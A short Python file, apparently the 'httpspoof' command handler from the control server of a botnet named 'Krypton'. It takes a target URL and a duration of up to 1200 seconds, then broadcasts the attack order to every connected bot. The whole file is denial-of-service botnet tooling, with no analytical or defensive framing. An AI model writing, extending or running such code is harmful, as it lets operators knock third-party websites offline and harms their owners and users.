from colorama import Fore

def httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 3:
        url = args[1]
        secs = args[2]
        if validate_time(secs):
            send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
            broadcast(data)
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpspoof [URL] [TIME]\n')
